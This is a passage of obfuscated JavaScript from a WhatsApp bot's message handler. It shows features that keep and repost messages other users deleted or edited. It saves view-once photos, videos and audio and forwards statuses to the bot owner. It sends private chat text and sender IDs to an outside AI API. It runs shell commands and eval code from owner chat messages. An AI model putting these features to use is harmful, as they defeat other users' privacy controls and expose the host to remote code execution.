    const _0x3f4dc0 = "./src/store.json";
    function _0x3a589b() {
      if (fs.existsSync(_0x3f4dc0)) {
        return JSON.parse(fs.readFileSync(_0x3f4dc0));
      }
      return {};
    }
    if (_0x50668e.sender !== _0x52b559 && db.data.settings.antidelete === "private" && _0x50668e.message?.protocolMessage?.type === 0 && _0x50668e.message?.protocolMessage?.key) {
      try {
        let _0x2600fc = _0x50668e.message.protocolMessage.key.id;
        let _0x107520 = _0x50668e.chat;
        let _0x73aded = _0x50668e.sender;
        let _0x4deca5 = _0x3a589b();
        let _0x5f5aad = _0x4deca5[_0x107520]?.[_0x2600fc];
        if (!_0x5f5aad) {
          console.log("⚠️ Deleted message not found in store.json.");
          return;
        }
        let _0x13e294 = _0x5f5aad.sender;
        let _0x2ddfca = _0x107520.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";
        let _0x586706 = moment(_0x5f5aad.timestamp * 1000).tz("" + timezones).locale("en").format("HH:mm z");
        let _0x4d13ef = moment(_0x5f5aad.timestamp * 1000).tz("" + timezones).format("DD/MM/YYYY");
        let _0xa326d9 = "🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x2ddfca + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x13e294.split("@")[0] + " \n𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: " + _0x586706 + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0x4d13ef + "\n𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @" + _0x73aded.split("@")[0] + "\n\n𝙼𝙴𝚂𝚂𝙰𝙶𝙴: " + _0x5f5aad.text;
        let _0x19aef9 = {
          key: {
            remoteJid: _0x107520,
            fromMe: _0x13e294 === _0x1548f3.user.id,
            id: _0x2600fc,
            participant: _0x13e294
          },
          message: {
            conversation: _0x5f5aad.text
          }
        };
        await _0x1548f3.sendMessage(_0x1548f3.user.id, {
          text: _0xa326d9,
          mentions: [_0x13e294, _0x73aded]
        }, {
          quoted: _0x19aef9
        });
      } catch (_0x148f27) {
        console.error("❌ Error processing deleted message:", _0x148f27);
      }
    } else if (_0x50668e.sender !== _0x52b559 && db.data.settings.antidelete === "chat" && _0x50668e.message?.protocolMessage?.type === 0 && _0x50668e.message?.protocolMessage?.key) {
      try {
        let _0x3b6185 = _0x50668e.message.protocolMessage.key.id;
        let _0x188294 = _0x50668e.chat;
        let _0x2d1cc6 = _0x50668e.sender;
        let _0x6a50f5 = _0x3a589b();
        let _0x2e34b6 = _0x6a50f5[_0x188294]?.[_0x3b6185];
        if (!_0x2e34b6) {
          console.log("⚠️ Deleted message not found in store.json.");
          return;
        }
        let _0x4ac3f2 = _0x2e34b6.sender;
        let _0x176db7 = _0x188294.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";
        let _0xb9233d = moment(_0x2e34b6.timestamp * 1000).tz("" + timezones).locale("en").format("HH:mm z");
        let _0x1c5f00 = moment(_0x2e34b6.timestamp * 1000).tz("" + timezones).format("DD/MM/YYYY");
        let _0x342566 = "🚨 *𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x176db7 + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x4ac3f2.split("@")[0] + " \n𝚃𝙸𝙼𝙴 𝚂𝙴𝙽𝚃: " + _0xb9233d + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0x1c5f00 + "\n𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @" + _0x2d1cc6.split("@")[0] + "\n\n𝙼𝙴𝚂𝚂𝙰𝙶𝙴: " + _0x2e34b6.text;
        let _0x1194b6 = {
          key: {
            remoteJid: _0x188294,
            fromMe: _0x4ac3f2 === _0x1548f3.user.id,
            id: _0x3b6185,
            participant: _0x4ac3f2
          },
          message: {
            conversation: _0x2e34b6.text
          }
        };
        await _0x1548f3.sendMessage(_0x50668e.chat, {
          text: _0x342566,
          mentions: [_0x4ac3f2, _0x2d1cc6]
        }, {
          quoted: _0x1194b6
        });
      } catch (_0xd889ee) {
        console.error("❌ Error processing deleted message:", _0xd889ee);
      }
    }
    if (_0x50668e.sender !== _0x52b559 && !_0x50668e.id.startsWith("3EB0") && db.data.settings.antiedit === "private" && (_0x50668e.message?.protocolMessage?.editedMessage?.conversation || _0x50668e.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text)) {
      try {
        let _0x46d46a = _0x50668e.message.protocolMessage.key.id;
        let _0x36782b = _0x50668e.chat;
        let _0x200bd9 = _0x50668e.sender;
        let _0x16b160 = _0x3a589b();
        let _0x2effe7 = _0x16b160[_0x36782b]?.[_0x46d46a];
        if (!_0x2effe7) {
          console.log("⚠️ Original message not found in store.json.");
          return;
        }
        let _0x56c8f9 = _0x2effe7.sender;
        let _0x35a7b6 = _0x36782b.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";
        let _0x3069fa = moment(_0x2effe7.timestamp * 1000).tz("" + timezones).locale("en").format("HH:mm z");
        let _0x4f117c = moment(_0x2effe7.timestamp * 1000).tz("" + timezones).format("DD/MM/YYYY");
        let _0x5e12fa = "🚨 *𝙴𝙳𝙸𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x35a7b6 + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x56c8f9.split("@")[0] + " \n𝚂𝙴𝙽𝚃 𝙾𝙽: " + _0x3069fa + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0x4f117c + "\n𝙴𝙳𝙸𝚃𝙴𝙳 𝙱𝚈: @" + _0x200bd9.split("@")[0] + "\n\n𝙾𝚁𝙸𝙶𝙸𝙽𝙰𝙻 𝙼𝚂𝙶: " + _0x2effe7.text + "\n\n𝙴𝙳𝙸𝚃𝙴𝙳 𝚃𝙾: " + (_0x50668e.message.protocolMessage?.editedMessage?.conversation || _0x50668e.message.protocolMessage?.editedMessage?.extendedTextMessage?.text);
        let _0x2cf3dd = {
          key: {
            remoteJid: _0x36782b,
            fromMe: _0x56c8f9 === _0x1548f3.user.id,
            id: _0x46d46a,
            participant: _0x56c8f9
          },
          message: {
            conversation: _0x2effe7.text
          }
        };
        await _0x1548f3.sendMessage(_0x1548f3.user.id, {
          text: _0x5e12fa,
          mentions: [_0x56c8f9, _0x200bd9]
        }, {
          quoted: _0x2cf3dd
        });
      } catch (_0x39bee1) {
        console.error("❌ Error processing edited message:", _0x39bee1);
      }
    } else if (_0x50668e.sender !== _0x52b559 && !_0x50668e.id.startsWith("3EB0") && db.data.settings.antiedit === "chat" && (_0x50668e.message?.protocolMessage?.editedMessage?.conversation || _0x50668e.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text)) {
      try {
        let _0xdca498 = _0x50668e.message.protocolMessage.key.id;
        let _0x119160 = _0x50668e.chat;
        let _0x484dbd = _0x50668e.sender;
        let _0x32351c = _0x3a589b();
        let _0x3d6724 = _0x32351c[_0x119160]?.[_0xdca498];
        if (!_0x3d6724) {
          console.log("⚠️ Original message not found in store.json.");
          return;
        }
        let _0x13a720 = _0x3d6724.sender;
        let _0x244fc9 = _0x119160.endsWith("@g.us") ? "(Group Chat)" : "(Private Chat)";
        let _0xa23120 = moment(_0x3d6724.timestamp * 1000).tz("" + timezones).locale("en").format("HH:mm z");
        let _0x153e76 = moment(_0x3d6724.timestamp * 1000).tz("" + timezones).format("DD/MM/YYYY");
        let _0x98ccbc = "🚨 *𝙴𝙳𝙸𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴!* 🚨\n" + readmore + "\n𝙲𝙷𝙰𝚃: " + _0x244fc9 + "\n𝚂𝙴𝙽𝚃 𝙱𝚈: @" + _0x13a720.split("@")[0] + " \n𝚂𝙴𝙽𝚃 𝙾𝙽: " + _0xa23120 + "\n𝙳𝙰𝚃𝙴 𝚂𝙴𝙽𝚃: " + _0x153e76 + "\n𝙴𝙳𝙸𝚃𝙴𝙳 𝙱𝚈: @" + _0x484dbd.split("@")[0] + "\n\n𝙾𝚁𝙸𝙶𝙸𝙽𝙰𝙻 𝙼𝚂𝙶: " + _0x3d6724.text + "\n\n𝙴𝙳𝙸𝚃𝙴𝙳 𝚃𝙾: " + (_0x50668e.message.protocolMessage?.editedMessage?.conversation || _0x50668e.message.protocolMessage?.editedMessage?.extendedTextMessage?.text);
        let _0x240293 = {
          key: {
            remoteJid: _0x119160,
            fromMe: _0x13a720 === _0x1548f3.user.id,
            id: _0xdca498,
            participant: _0x13a720
          },
          message: {
            conversation: _0x3d6724.text
          }
        };
        await _0x1548f3.sendMessage(_0x50668e.chat, {
          text: _0x98ccbc,
          mentions: [_0x13a720, _0x484dbd]
        }, {
          quoted: _0x240293
        });
      } catch (_0x3475a6) {
        console.error("❌ Error processing edited message:", _0x3475a6);
      }
    }
    if (db.data.settings.autoread === "all" || db.data.settings.autoread === "group" && _0x50668e.isGroup || db.data.settings.autoread === "pm" && !_0x50668e.isGroup || db.data.settings.autoread === "command" && _0x1a38e3) {
      _0x1548f3.readMessages([_0x50668e.key]);
    }
    if (_0x50668e.quoted && _0x50668e.quoted.viewOnce && (_0x50668e.message?.conversation || _0x50668e.message?.extendedTextMessage) && _0x22e08b && ["🌚", "😂", "🥲", "🤔", "🤭", "🍆", "🥵", "🫂", "😳"].some(_0xe8b1e7 => _0x50668e.body.startsWith(_0xe8b1e7))) {
      (async () => {
        try {
          let _0x3f2ff2 = _0x50668e.msg?.contextInfo?.quotedMessage;
          if (!_0x3f2ff2) {
            return console.log("Quoted message not found.");
          }
          let _0x5b805d = Object.keys(_0x3f2ff2)[0];
          if (!_0x5b805d || !/image|video|audioMessage/.test(_0x5b805d)) {
            console.log("*Invalid media type!*");
            return;
          }
          let _0x2a60ac;
          let _0x11553e = _0x3f2ff2[_0x5b805d]?.caption || global.wm;
          let _0x430eb2;
          if (_0x5b805d === "imageMessage") {
            _0x2a60ac = await downloadContentFromMessage(_0x3f2ff2[_0x5b805d], "image");
            _0x430eb2 = "media.jpg";
          } else if (_0x5b805d === "videoMessage") {
            _0x2a60ac = await downloadContentFromMessage(_0x3f2ff2[_0x5b805d], "video");
            _0x430eb2 = "media.mp4";
          } else if (_0x5b805d === "audioMessage") {
            _0x2a60ac = await downloadContentFromMessage(_0x3f2ff2[_0x5b805d], "audio");
            _0x430eb2 = "audio.mp3";
          }
          const _0xbc5cbd = [];
          for await (const _0x252f5c of _0x2a60ac) {
            _0xbc5cbd.push(_0x252f5c);
          }
          const _0x41e132 = Buffer.concat(_0xbc5cbd);
          if (_0x5b805d === "audioMessage") {
            await _0x1548f3.sendMessage(_0x1548f3.user.id, {
              audio: _0x41e132,
              mimetype: "audio/mpeg"
            }, {
              quoted: _0x50668e
            });
          } else if (_0x5b805d === "videoMessage") {
            await _0x1548f3.sendMessage(_0x1548f3.user.id, {
              video: _0x41e132,
              caption: _0x11553e
            }, {
              quoted: _0x50668e
            });
          } else if (_0x5b805d === "imageMessage") {
            await _0x1548f3.sendMessage(_0x1548f3.user.id, {
              image: _0x41e132,
              caption: _0x11553e
            }, {
              quoted: _0x50668e
            });
          }
          _0xbc5cbd.length = 0;
          _0x41e132.fill(0);
          _0x3f2ff2 = null;
        } catch (_0x7305e7) {
          console.error("Error processing media:", _0x7305e7);
        }
      })();
    } else if (_0x50668e.message && _0x50668e.message.extendedTextMessage?.contextInfo?.quotedMessage && !_0x1a38e3 && _0x22e08b && _0x50668e.quoted.chat === "status@broadcast") {
      try {
        await _0x50668e.quoted.copyNForward(_0x1548f3.user.id, true);
        console.log("Status forwarded successfully!");
      } catch (_0x2c0842) {
        console.error("Error forwarding status:", _0x2c0842);
      }
    }
    if (db.data.settings.chatbot === true && (_0x50668e.message.extendedTextMessage?.text || _0x50668e.message.conversation) && !_0x22e08b && !_0x50668e.isGroup && !_0x1a38e3) {
      try {
        const _0x549826 = _0x50668e.sender;
        const _0x16ffac = _0x50668e.message.extendedTextMessage?.text || _0x50668e.message.conversation || "";
        if (!_0x16ffac.trim()) {
          return;
        }
        await _0x1548f3.sendPresenceUpdate("composing", _0x50668e.chat);
        const _0x11c88c = async () => {
          const _0x4137e6 = "https://bk9.fun/ai/GPT4o";
          const _0x186881 = {
            q: _0x16ffac.trim(),
            userId: _0x549826
          };
          return axios.get(_0x4137e6, {
            params: _0x186881
          });
        };
        const _0x5dd209 = async () => {
          const _0x2efb73 = "https://bk9.fun/ai/Llama3";
          const _0x4f7e76 = {
            q: _0x16ffac.trim(),
            userId: _0x549826
          };
          return axios.get(_0x2efb73, {
            params: _0x4f7e76
          });
        };
        try {
          const _0x2a99b5 = await _0x5dd209();
          const _0x3d8733 = _0x2a99b5.data?.BK9;
          if (_0x3d8733) {
            await _0x1548f3.sendMessage(_0x50668e.chat, {
              text: "" + _0x3d8733
            }, {
              quoted: _0x50668e
            });
          }
        } catch (_0x1ad71c) {
          console.error("Primary API request failed:", _0x1ad71c);
          try {
            const _0x535d2e = await _0x11c88c();
            const _0xc6ea = _0x535d2e.data?.BK9;
            if (_0xc6ea) {
              await _0x1548f3.sendMessage(_0x50668e.chat, {
                text: "" + _0xc6ea
              }, {
                quoted: _0x50668e
              });
            }
          } catch (_0x5d702f) {
            console.error("Fallback API request failed:", _0x5d702f);
          }
        }
      } catch (_0x5dfd7c) {
        console.error("Error processing chatbot request:", _0x5dfd7c);
      }
    }
    function _0x5956de() {
      if (!global.db.data.blacklist) {
        global.db.data.blacklist = {
          blacklisted_numbers: []
        };
      }
      return global.db.data.blacklist;
    }
    const _0x310e44 = _0x50668e.chat;
    const _0x40d3ab = _0x50668e.key.remoteJid;
    const _0x586767 = _0x5956de();
    if ((_0x586767.blacklisted_numbers.includes(_0x40d3ab) || _0x586767.blacklisted_numbers.includes(_0x310e44)) && _0x40d3ab !== _0x52b559 && !_0x50668e.key.fromMe) {
      return;
    }
    if (["120363305699578483@g.us", "120363305699578483@g.us"].includes(_0x50668e.chat)) {
      if (_0x1a38e3 && !_0x22e08b && !_0x50668e.key.fromMe) {
        return;
      }
    }
    if (db.data.settings.mode === "private") {
      if (_0x1a38e3 && !_0x22e08b && !_0x50668e.key.fromMe) {
        return;
      }
    } else if (db.data.settings.mode === "group") {
      if (_0x1a38e3 && !_0x50668e.isGroup && !_0x22e08b && !_0x50668e.key.fromMe) {
        return;
      }
    } else if (db.data.settings.mode === "pm") {
      if (_0x1a38e3 && _0x50668e.isGroup && !_0x22e08b && !_0x50668e.key.fromMe) {
        return;
      }
    }
    const _0x200a8f = db.data.settings.mode === "public" ? "Public" : db.data.settings.mode === "private" ? "Private" : db.data.settings.mode === "group" ? "Group Only" : db.data.settings.mode === "pm" ? "PM Only" : "Unknown";
    const _0x569fe9 = {
      key: {
        participants: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "Halo"
      },
      message: {
        contactMessage: {
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=" + _0x50668e.sender.split("@")[0] + ":" + _0x50668e.sender.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
        }
      },
      participant: "0@s.whatsapp.net"
    };
    const _0x1bf428 = async _0x19d8aa => {
      _0x1548f3.sendMessage(_0x50668e.chat, {
        text: _0x19d8aa,
        contextInfo: {
          forwardingScore: 9999999,
          isForwarded: true
        }
      }, {
        quoted: _0x50668e
      });
    };
    const _0x2d841c = async _0xcc7c30 => {
      _0x50668e.reply(_0xcc7c30);
    };
    const _0x2c2dcd = async _0x416a87 => {
      _0x1548f3.sendMessage(_0x50668e.chat, {
        text: _0x416a87,
        contextInfo: {
          mentionedJid: [_0x50668e.sender],
          forwardingScore: 9999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363305699578483@newsletter",
            serverMessageId: 20,
            newsletterName: "❃𝗔𝗗𝗜𝗭𝗔 𝗕𝗢𝗧"
          },
          externalAdReply: {
            title: "𝗔𝗗𝗜𝗭𝗔 𝗕𝗢𝗧",
            body: "",
            thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg",
            sourceUrl: null,
            mediaType: 1
          }
        }
      }, {
        quoted: _0x50668e
      });
    };
    const _0x1a76d4 = require("./lib/PluginManager");
    const _0x2fedec = new _0x1a76d4(path.resolve(__dirname, "./src/Plugins"));
    (async () => {
      const _0x5a3e79 = {
        Cypher: _0x1548f3,
        m: _0x50668e,
        reply: _0x1bf428,
        args: _0xf1d912,
        quoted: _0x4e3272,
        mime: _0xd51678,
        prefix: _0x1ef2dc,
        command: _0x1a38e3,
        text: _0x5e01bb,
        bad: bad,
        isCreator: _0x22e08b,
        mess: mess,
        db: db,
        botNumber: _0x52b559,
        modeStatus: _0x200a8f,
        sleep: sleep,
        isUrl: isUrl,
        versions: versions,
        full_args: _0x422642,
        setHerokuEnvVar: _0x55f7bd,
        getHerokuEnvVars: _0x5047ce,
        deleteHerokuEnvVar: _0x308cc8,
        from: _0x1f0527,
        isAdmins: _0x419a1c,
        isBotAdmins: _0x26d2c7,
        isGroupOwner: _0x340bc5,
        participants: _0x2661d9,
        q: q,
        store: _0x1f8e8d,
        sender: _0xde2846,
        botname: botname,
        ownername: ownername,
        ownernumber: ownernumber,
        fetchMp3DownloadUrl: _0x383df2,
        fetchVideoDownloadUrl: _0x5edfc1,
        saveStatusMessage: _0x4b18ab,
        groupMetadata: _0x3ab04a,
        fetchJson: fetchJson,
        acr: acr,
        obfus: _0x5b6bb2,
        from: _0x1f0527,
        pushname: _0x2253ff,
        ephoto: _0x560a1a,
        loadBlacklist: _0x5956de,
        mainOwner: mainOwner,
        approveAllRequests: _0xd48e3,
        disapproveAllRequests: _0x5354ed,
        listGroupRequests: _0xb2a875,
        isGroupAdmins: _0x3d8712
      };
      if (_0x1a38e3) {
        try {
          const _0x35aef9 = await _0x2fedec.executePlugin(_0x5a3e79, _0x1a38e3);
        } catch (_0x32ea96) {
          console.error("Error executing command:", _0x32ea96.message);
          _0x1548f3.sendMessage(_0x1548f3.user.id, {
            text: "An error occurred: " + _0x32ea96.message
          });
        }
      }
    })();
    switch (_0x1a38e3) {
      case "menu":
        const _0x249946 = _0x538e54 => {
          if (_0x538e54 < 1073741824) {
            return Math.round(_0x538e54 / 1024 / 1024) + " MB";
          } else {
            return Math.round(_0x538e54 / 1024 / 1024 / 1024) + " GB";
          }
        };
        const _0x2ed8c0 = (_0x42cd73, _0x512d85, _0xb3075b = 10) => {
          let _0x2d8acd = Math.round(_0x42cd73 / _0x512d85 * _0xb3075b);
          let _0x53ba51 = "█".repeat(_0x2d8acd) + "░".repeat(_0xb3075b - _0x2d8acd);
          return "[" + _0x53ba51 + "] " + Math.round(_0x42cd73 / _0x512d85 * 100) + "%";
        };
        const _0x4ba61c = (_0x292ced, _0x7fd380, _0x201b3c, _0xa4c7c7, _0x33514f, _0xc3ee53, _0x1746ba) => {
          const _0x4a51b2 = process.memoryUsage();
          const _0x3a3793 = _0x4a51b2.heapUsed;
          const _0x4497bb = os.totalmem();
          const _0x18d668 = _0x4497bb - os.freemem();
          const _0x1ecb54 = _0x12d8fd => {
            if (_0x12d8fd < 1073741824) {
              return Math.round(_0x12d8fd / 1024 / 1024) + " MB";
            } else {
              return Math.round(_0x12d8fd / 1024 / 1024 / 1024) + " GB";
            }
          };
          const _0x277b6d = (_0x3463fb, _0x43f39d, _0x870af = 10) => {
            let _0x459442 = Math.round(_0x3463fb / _0x43f39d * _0x870af);
            let _0x479819 = "█".repeat(_0x459442) + "░".repeat(_0x870af - _0x459442);
            return "[" + _0x479819 + "] " + Math.round(_0x3463fb / _0x43f39d * 100) + "%";
          };
          let _0x25e6ef = 0;
          const _0x5de8b8 = new Set();
          for (const _0x335c5d in _0x292ced) {
            _0x292ced[_0x335c5d].forEach(_0x3c16b4 => {
              if (_0x3c16b4.command.length > 0) {
                _0x5de8b8.add(_0x3c16b4.command[0]);
              }
            });
          }
          _0x25e6ef = _0x5de8b8.size;
          let _0x310126 = "╭┉╾▣ ◈ *🌹𝗤𝗨𝗘𝗘𝗡𝗭𝗬🌹* ◈\n";
          _0x310126 += "┊ *ᴏᴡɴᴇʀ* : " + _0x7fd380 + "\n";
          _0x310126 += "┇ *ᴘʀᴇғɪx* : [ " + _0x201b3c + " ]\n";
          _0x310126 += "┇ *ʜᴏsᴛ* : " + os.platform() + "\n";
          _0x310126 += "┇ *ᴘʟᴜɢɪɴs* : " + _0x25e6ef + "\n";
          _0x310126 += "┇ *ᴍᴏᴅᴇ* : " + _0xa4c7c7 + "\n";
          _0x310126 += "┇ *ᴠᴇʀsɪᴏɴ* : " + _0x33514f + "\n";
          _0x310126 += "┇ *sᴘᴇᴇᴅ* : " + _0xc3ee53.toFixed(4) + " ms\n";
          _0x310126 += "┇ *ᴜsᴀɢᴇ* : " + _0x1ecb54(_0x3a3793) + " of " + _0x1ecb54(_0x4497bb) + "\n";
          _0x310126 += "┇ *ʀᴀᴍ:* " + _0x277b6d(_0x18d668, _0x4497bb) + "\n";
          _0x310126 += "╰┉┉┉▣ \n" + _0x1746ba + "\n";
          for (const _0x1daaac in _0x292ced) {
            _0x310126 += "╭┉╾▣ ◈  *" + _0x1daaac.toUpperCase() + " MENU* ◈\n";
            _0x292ced[_0x1daaac].forEach(_0x3fd21f => {
              if (_0x3fd21f.command.length > 0) {
                _0x310126 += "┊⚡ " + _0x3fd21f.command[0] + "\n";
              }
            });
            _0x310126 += "╰┉┉┉▣ \n\n";
          }
          return _0x310126;
        };
        const _0xd23b4b = _0x4a1ab3 => {
          const _0x1acd8b = {};
          const _0x15c6bc = fs.readdirSync(_0x4a1ab3);
          _0x15c6bc.forEach(_0x52e33d => {
            if (_0x52e33d.endsWith(".js")) {
              const _0x585c66 = path.join(_0x4a1ab3, _0x52e33d);
              try {
                delete require.cache[require.resolve(_0x585c66)];
                const _0x3d028d = require(_0x585c66);
                const _0x36d7b6 = path.basename(_0x52e33d, ".js");
                if (!_0x1acd8b[_0x36d7b6]) {
                  _0x1acd8b[_0x36d7b6] = [];
                }
                _0x1acd8b[_0x36d7b6].push(..._0x3d028d);
              } catch (_0x3e3e50) {
                console.error("Error loading plugin at " + _0x585c66 + ":", _0x3e3e50);
              }
            }
          });
          return _0x1acd8b;
        };
        const _0x80311d = [tylorkid1, tylorkid2, tylorkid3, tylorkid4, tylorkid5][Math.floor(Math.random() * 5)];
        const _0x3a59c4 = performance.now();
        await _0x50668e.reply("𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝘼𝙙𝙞𝙯𝙖-𝙫2.4.0...");
        const _0x5c7c0a = performance.now();
        const _0x3328d8 = _0x5c7c0a - _0x3a59c4;
        const _0x2cb67a = _0xd23b4b(path.resolve(__dirname, "./src/Plugins"));
        const _0x52aa90 = _0x4ba61c(_0x2cb67a, ownername, _0x1ef2dc, _0x200a8f, versions, _0x3328d8, readmore);
        if (global.db.data.settings.menustyle === "1") {
          _0x1548f3.sendMessage(_0x50668e.chat, {
            document: {
              url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png"
            },
            caption: _0x52aa90,
            mimetype: "application/zip",
            fileName: "" + botname,
            fileLength: "9999999",
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: "",
                body: "",
                thumbnail: _0x80311d,
                sourceUrl: plink,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: _0x569fe9
          });
        } else if (global.db.data.settings.menustyle === "2") {
          _0x50668e.reply(_0x52aa90);
        } else if (global.db.data.settings.menustyle === "3") {
          _0x1548f3.sendMessage(_0x50668e.chat, {
            text: _0x52aa90,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnail: _0x80311d,
                sourceUrl: plink,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          }, {
            quoted: _0x50668e
          });
        } else if (global.db.data.settings.menustyle === "4") {
          _0x1548f3.sendMessage(_0x50668e.chat, {
            image: _0x80311d,
            caption: _0x52aa90
          }, {
            quoted: _0x50668e
          });
        } else if (global.db.data.settings.menustyle === "5") {
          let _0x581589 = generateWAMessageFromContent(_0x50668e.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: null
                  },
                  footer: {
                    text: _0x52aa90
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      text: null
                    }]
                  }
                }
              }
            }
          }, {
            quoted: _0x50668e
          });
          _0x1548f3.relayMessage(_0x50668e.chat, _0x581589.message, {
            messageId: _0x581589.key.id
          });
        } else if (global.db.data.settings.menustyle === "6") {
          _0x1548f3.relayMessage(_0x50668e.chat, {
            requestPaymentMessage: {
              currencyCodeIso4217: "USD",
              requestFrom: "0@s.whatsapp.net",
              amount1000: "1",
              noteMessage: {
                extendedTextMessage: {
                  text: _0x52aa90,
                  contextInfo: {
                    mentionedJid: [_0x50668e.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  }
                }
              }
            }
          }, {});
        }
        break;
      default:
        {
          if (_0x5d77e8.startsWith("$")) {
            if (!_0x22e08b) {
              return;
            }
            exec(_0x5d77e8.slice(2), (_0x19359f, _0x5ef7dc) => {
              if (_0x19359f) {
                return _0x50668e.reply(_0x19359f);
              }
              if (_0x5ef7dc) {
                return _0x50668e.reply(_0x5ef7dc);
              }
            });
          }
          if (_0x5d77e8.startsWith(">")) {
            if (!_0x22e08b) {
              return;
            }
            try {
              let _0x572478 = await eval(_0x5d77e8.slice(2));
              if (typeof _0x572478 !== "string") {
                _0x572478 = require("util").inspect(_0x572478);
              }
              await _0x50668e.reply(_0x572478);
            } catch (_0x56ab6e) {
              console.error(_0x56ab6e);
              await _0x50668e.reply(String(_0x56ab6e));
            }
          }
          if (_0x5d77e8.startsWith("=>")) {
            if (!_0x22e08b) {
              return;
            }
            function _0x24ef35(_0xbb6e53) {
              let _0x22219e = JSON.stringify(_0xbb6e53, null, 2);
              let _0x4b314d = util.format(_0x22219e);
              if (_0x22219e == undefined) {
                _0x4b314d = util.format(_0xbb6e53);
              }
              return _0x50668e.reply(_0x4b314d);
            }
            try {
              const _0x3a28a8 = await eval("(async () => { return " + _0x5d77e8.slice(3) + " })()");
              _0x50668e.reply(util.format(_0x3a28a8));
            } catch (_0x21404a) {
              console.error(_0x21404a);
              _0x50668e.reply(String(_0x21404a));
            }
          }
        }
    }
  } catch (_0x55d0ec) {
    let _0xc29c3a = util.format(_0x55d0ec);
    let _0x53680d = String(_0xc29c3a);
    if (shouldLogError(_0x53680d)) {
      if (typeof _0x55d0ec === "string") {
        _0x50668e.reply("An error occurred:\n\nError Description: " + _0x53680d);
      } else {
        console.log(_0xc29c3a);
        _0x1548f3.sendMessage(_0x1548f3.user.id, {
          text: "An error occurred:\n\nError Description: " + _0x53680d,
          contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true
          }
        }, {
          ephemeralExpiration: 60
        });
      }
      recordError(_0x53680d);
    } else {
      console.log("Repeated error suppressed: " + _0x53680d);
    }
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(color("Updated '" + __filename + "'", "cyan"));
  delete require.cache[file];
  require(file);
});